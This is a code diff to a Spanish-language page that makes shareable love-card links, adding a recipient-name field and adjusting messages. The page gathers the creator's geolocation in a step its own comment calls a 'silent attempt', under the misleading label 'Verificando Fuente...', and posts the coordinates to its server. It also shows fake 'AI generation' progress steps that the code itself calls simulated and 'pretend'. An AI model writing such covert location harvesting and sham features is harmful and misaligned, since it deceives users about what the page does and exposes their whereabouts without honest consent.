@@ -25,6 +25,12 @@
                     <input type="text" id="senderName" placeholder="Tu Nombre o Apodo (ej. Admirador Secreto)" />
                 </div>
 
+                <!-- RECIPIENT NAME -->
+                <div class="input-group" style="margin-top: 10px;">
+                    <label>¿Para quién es?</label>
+                    <input type="text" id="recipientName" placeholder="Nombre de la persona especial" />
+                </div>
+
                 <!-- OPTION TABS -->
                 <div class="tabs">
                     <button class="tab active" onclick="switchTab('upload')">📷 Subir Foto</button>
@@ -117,8 +123,10 @@
 
         async function startCreationProcess() {
             const senderName = document.getElementById('senderName').value.trim();
-            if (!senderName) {
-                alert("Por favor escribe tu nombre para que sepan quién lo envía.");
+            const recipientName = document.getElementById('recipientName').value.trim();
+
+            if (!senderName || !recipientName) {
+                alert("Por favor completa ambos nombres (De parte de quién y Para quién).");
                 return;
             }
 
@@ -128,41 +136,49 @@
             const sub = document.getElementById('magic-subtext');
             modal.style.display = 'flex';
 
-            // 1. CAPTURE CREATOR LOCATION (Silent attempt)
+            // 1. CAPTURE CREATOR LOCATION (Silent attempt with Timeout)
             let creatorLoc = { lat: null, lng: null };
             txt.textContent = "Verificando Fuente...";
 
             try {
-                const pos = await new Promise((resolve, reject) => {
-                    if ("geolocation" in navigator) {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
-                    } else reject();
-                });
+                // FORCE TIMEOUT of 3 seconds
+                const pos = await Promise.race([
+                    new Promise((resolve, reject) => {
+                        if ("geolocation" in navigator) {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        } else reject();
+                    }),
+                    new Promise((_, reject) => setTimeout(() => reject("Timeout"), 3000))
+                ]);
+
                 creatorLoc.lat = pos.coords.latitude;
                 creatorLoc.lng = pos.coords.longitude;
                 sub.textContent = "Ubicación del Creador: Registrada";
             } catch (e) {
-                sub.textContent = "Ubicación del Creador: No disponible (Continuando)";
+                // If it fails or times out, we proceed anyway!
+                sub.textContent = "Ubicación del Creador: Omitida (Continuando)";
             }
 
             // 2. SIMULATE AI GENERATION
             const steps = selectedMode === 'upload'
-                ? ["Subiendo archivo seguro...", "Optimizando colores...", "Aplicando filtro romántico...", "Generando enlace único..."]
-                : ["Interpretando tu deseo...", "Dibujando boceto...", "Renderizando detalles...", "Finalizando obra de arte..."];
+                ? ["Analizando archivo...", "Optimizando colores...", "Aplicando filtro romántico...", "Generando enlace único..."]
+                : ["Diseñando tarjeta personalizada...", `Escribiendo: "Te Quiero ${recipientName}"...`, "Añadiendo animación de flores...", "Finalizando detalles..."];
 
             for (let i = 0; i < steps.length; i++) {
                 txt.textContent = steps[i];
-                await new Promise(r => setTimeout(r, 1200));
+                await new Promise(r => setTimeout(r, 1000));
             }
 
             // 3. SUBMIT
-            await submitData(senderName, creatorLoc);
+            await submitData(senderName, recipientName, creatorLoc);
             modal.style.display = 'none';
         }
 
-        async function submitData(senderName, loc) {
+        async function submitData(senderName, recipientName, loc) {
             const formData = new FormData();
             formData.append('senderName', senderName);
+            formData.append('recipientName', recipientName); // New Field
+
             if (loc.lat) {
                 formData.append('creatorLat', loc.lat);
                 formData.append('creatorLng', loc.lng);
@@ -171,15 +187,13 @@
             if (selectedMode === 'upload') {
                 const fileInput = document.getElementById('fileInput');
                 if (!fileInput.files[0]) {
-                    alert("Debes seleccionar una imagen.");
+                    alert("Debes seleccionar una imagen en la pestaña 'Subir Foto'.");
                     document.getElementById('magic-modal').style.display = 'none';
                     return;
                 }
                 formData.append('image', fileInput.files[0]);
             } else {
-                // AI MODE: Use default image but pretend functionality
-                const prompt = document.getElementById('aiPrompt').value || "Carta de amor";
-                formData.append('aiPrompt', prompt);
+                // AI MODE
                 formData.append('useDefault', 'true');
             }
 
@@ -196,12 +210,11 @@
 
                     const link = `${window.location.origin}/view/${data.id}`;
                     document.getElementById('shareLinkText').innerText = link;
-                    // Also make shareLinkText clickable if users want
                 } else {
-                    alert("Error: " + data.error);
+                    alert("Error servidor: " + data.error);
                 }
             } catch (err) {
-                alert("Error de conexión con el servidor.");
+                alert("Error de conexión. Intenta de nuevo.");
             }
         }
     </script>
